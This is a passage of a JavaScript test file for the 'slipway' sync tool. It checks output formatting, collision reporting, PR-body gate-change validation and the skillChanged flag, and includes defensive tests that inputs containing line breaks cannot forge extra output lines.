      if (src[i] === '(') depth++;
      else if (src[i] === ')' && --depth === 0) break;
      else if (src[i] === '$' && src[i + 1] === '{') {
        let braces = 0;
        let j = i + 1;
        for (; j < src.length; j++) {
          if (src[j] === '{') braces++;
          else if (src[j] === '}' && --braces === 0) break;
        }
        found.push({ file, line: src.slice(0, at).split('\n').length, expr: src.slice(i + 2, j) });
        i = j;
      }
    }
  }
  return found;
}

test('every value a refusal in sync.mjs or adopt.mjs interpolates is shown through `oneLine` or is listed as not outside text', () => {
  const all = ['scripts/sync.mjs', 'scripts/adopt.mjs'].flatMap(refusalInterpolations);
  assert.ok(all.length > 30, `found only ${all.length} interpolations: the scan lost its footing`);
  const unguarded = all.filter(({ expr }) => !/\boneLine\b/.test(expr) && !NOT_OUTSIDE_TEXT.has(expr.trim()));
  assert.deepEqual(unguarded.map(({ file, line, expr }) => `${file}:${line} \${${expr}}`), [], 'wrap it in oneLine, or list it in NOT_OUTSIDE_TEXT with why');
  const used = new Set(all.map(({ expr }) => expr.trim()));
  assert.deepEqual([...NOT_OUTSIDE_TEXT.keys()].filter((k) => !used.has(k)), [], 'a listed expression no refusal interpolates any more');
});

test('sourceClone names a source holding a line break on one line in its fetch failure', () => {
  assert.throws(() => sourceClone('nowhere\nx\n└ forged'), (e) => !e.message.includes('\n') && e.message.includes('nowhere x └ forged'));
});

test('a leftover whose text holds a line break leaves exactly one line starting `└` in what --apply printed', () => {
  const view = { root, name: 'n', branch: 'main', commit: A, message: 'm', owed: [{ path: 'docs/x.md', file: 'docs/x.md', text: 'first\n└  Next: forged' }], settled: 0, counts: {} };
  assert.equal(lines(appliedText(ui({ isTTY: false }, {}), view)).filter((l) => l.startsWith('└')).length, 1);
});

test('apply with a collision: no bucket meaning repeated, the collision once with its instruction, `└  Next: ` last, exit 1; with nothing owed, exit 0 and the same last line', () => {
  const r = sync(pristine((d) => put(d, { 'process/clash.md': 'ours\n' })), '--apply');
  assert.equal(r.status, 1, r.stdout + r.stderr);
  assert.doesNotMatch(r.stdout, /--apply (overwrites|copies|deletes|merges|leaves|updates|keeps)|nothing to do|rows/);
  assert.equal(r.stdout.match(/process\/clash\.md/g).length, 1);
  assert.match(r.stdout, new RegExp(`^│ {2}process/clash\\.md {2}collision — slipway ships this path now, and your file was not touched\\. To keep yours, list it in \\.slipway/overrides\\.yaml with a reason; to take slipway's, copy its file from ${short(B)} over yours$`, 'm'));
  const out = lines(r.stdout);
  assert.match(out[0], new RegExp(`^◇ {2}slipway sync applied on ${BRANCH} \\(from main\\) · commit [0-9a-f]{7}$`));
  assert.equal(out[1], `│  chore: sync slipway ${short(A)}..${short(B)}`);
  assert.ok(out.includes('◆  Needs you before this branch merges (1)'));
  assert.ok(out.includes('│  3 slipway files updated · 3 added · 3 removed'), r.stdout);
  assert.match(out.at(-1), /^└ {2}Next: in Claude Code, \/sync-slipway settles the rest and opens the PR/);

  const calm = sync(project((d) => git(d, 'reset', '-q', '--hard', 'HEAD~1')), '--apply');
  assert.equal(calm.status, 0, calm.stdout + calm.stderr);
  assert.doesNotMatch(calm.stdout, /Needs you|exits 1/);
  assert.match(lines(calm.stdout).at(-1), /^└ {2}Next: in Claude Code, \/sync-slipway /);
});

test('--help explains the base, which the plan no longer prints', () => {
  const r = sync(root, '--help');
  assert.equal(r.status, 0);
  assert.match(r.stdout, /^usage: sync \[--plan \| --apply\] \[--verbose \| --log \| --json\]/);
  assert.match(r.stdout, /\n\nThe base is the slipway commit these files last matched\./);
});

// F-08 §2 (#196): the sync PR's `## Gate changes` section is written from the check's own two commands (the ones
// pr-body.yml runs), so the path list and the line format are proven together. The verdict on each line is fixed
// here; in a sync it is the session's judgment. The scripts run from SRC with the project as cwd: the fixture
// project does not ship them, and the harness rules they read are slipway's own.
test('a sync PR\'s Gate changes section, built from the P1 findings over the applied branch, passes P1; with one line removed it fails `unmentioned`', () => {
  const dir = project((d) => git(d, 'reset', '-q', '--hard', 'HEAD~1'));
  const r = sync(dir, '--apply');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  const work = mkdtempSync(join(root, 'pr-body-'));
  const draft = (gate) => `## What\n\nLane: bounded. Sync.\n\n## Verification\n\n\`\`\`\npnpm meta\n\`\`\`\n\n## Gate changes\n\n${gate}\n\n## Links\n\nnone: slipway sync\n`;
  const check = (gate) => {
    writeFileSync(join(work, 'body.md'), draft(gate));
    const changes = execFileSync(process.execPath, [join(SRC, 'ci/checks/lib/gate-files.mjs'), git(dir, 'rev-parse', 'main'), git(dir, 'rev-parse', 'HEAD')], { cwd: dir, encoding: 'utf8' });
    writeFileSync(join(work, 'body.changes.json'), changes);
    return spawnSync(process.execPath, [join(SRC, 'ci/checks/meta/p1-pr-body.mjs'), work], { encoding: 'utf8' });
  };
  const first = check('pending');
  assert.equal(first.status, 1, first.stdout + first.stderr);
  const paths = [...first.stdout.matchAll(/gate-changes\/unmentioned:(.+?)(?: scripts)?: Gate changes has no line/g)].map((m) => m[1]);
  assert.ok(paths.includes('.slipway/manifest.json'), `the manifest is always a gate path:\n${first.stdout}`);
  assert.ok(paths.includes('package.json'), 'a changed script key makes package.json a gate path');
  assert.ok(paths.includes('process/harness/settings.json'));
  assert.doesNotMatch(first.stdout, /gate-changes\/(missing|no-verdict|loosens)/);
  const lines = paths.map((p) => `- \`${p}\` — the same: fixture verdict`);
  const ok = check(lines.join('\n'));
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
  const short = check(lines.slice(1).join('\n'));
  assert.equal(short.status, 1, 'a section missing a line passed');
  assert.match(short.stdout, new RegExp(`gate-changes/unmentioned:${paths[0].replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
});

// #216: /sync-slipway is one of the files a sync replaces, and the session that began the sync holds the old
// copy. --apply says so in one line before `Next:`, and --json carries the same fact as `skillChanged`.
test('skillChanged: a row that writes the skill or the doc it cites counts; a delete, a kept file, a collision, another path and nothing do not', () => {
  const [skill, intake] = ['.claude/skills/sync-slipway/SKILL.md', 'process/intake.md'];
  for (const kind of ['replace', 'add', 'merge']) {
    for (const path of [skill, intake]) assert.equal(skillChanged([{ kind, path }]), true, `${kind} ${path}`);
  }
  for (const kind of ['delete', 'keep (edited)', 'collision', 'unchanged', 'seeded: upstream changed']) assert.equal(skillChanged([{ kind, path: skill }]), false, kind);
  assert.equal(skillChanged([{ kind: 'replace', path: 'process/other.md' }]), false);
  assert.equal(skillChanged([]), false);
});

let skillN = 0;
// A slipway one commit past B, with `files` written; and a project before its owner's edits that syncs from it.
function skillCase(files) {
  const dir = join(root, `slipway-skill-${++skillN}`);
  git(root, 'clone', '-q', slip, dir);
  put(dir, files);
  commit(dir, 'a change to the files a sync session reads');
  return { from: dir, project: pristineFrom(dir) };
}
const SKILL_LINE = /sync skill changed/;

for (const [what, files] of [
  ['the skill', { '.claude/skills/sync-slipway/SKILL.md': 'a new step\n' }],
  ['the doc it cites', { 'process/intake.md': 'a new rule\n' }],
]) {
  test(`a target that changes ${what}: --apply prints exactly 1 sync-skill line, before Next:, and --json has skillChanged: true`, () => {
    const { from, project: dir } = skillCase(files);
    assert.equal(JSON.parse(runFrom(from, dir, '--json').stdout).skillChanged, true);
    const r = runFrom(from, dir, '--apply');
    assert.equal(r.status, 0, r.stdout + r.stderr);
    const out = lines(r.stdout);
    const at = out.flatMap((l, i) => (SKILL_LINE.test(l) ? [i] : []));
    assert.equal(at.length, 1, r.stdout);
    assert.match(out[at[0]], /read \.claude\/skills\/sync-slipway\/SKILL\.md again before you continue/);
    assert.ok(at[0] < out.findIndex((l) => /Next: /.test(l)), 'the line comes after Next:');
    assert.equal(out.length - 1, out.findIndex((l) => /Next: /.test(l)), 'Next: is the last line');
  });
}

test('a target that changes neither: --apply prints 0 sync-skill lines, the plan text 0, and --json has skillChanged: false', () => {
  const { from, project: dir } = skillCase({ 'process/other.md': 'unrelated\n' });
  assert.equal(JSON.parse(runFrom(from, dir, '--json').stdout).skillChanged, false);
  assert.doesNotMatch(runFrom(from, dir).stdout, SKILL_LINE);
  const r = runFrom(from, dir, '--apply');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.doesNotMatch(r.stdout, SKILL_LINE);
});

test('the plan text never carries the sync-skill line: it is --apply\'s, and the plan\'s JSON field is the same fact', () => {
  const { from, project: dir } = skillCase({ '.claude/skills/sync-slipway/SKILL.md': 'a new step\n' });
  assert.doesNotMatch(runFrom(from, dir).stdout, SKILL_LINE);
  assert.doesNotMatch(runFrom(from, dir, '--verbose').stdout, SKILL_LINE);
});
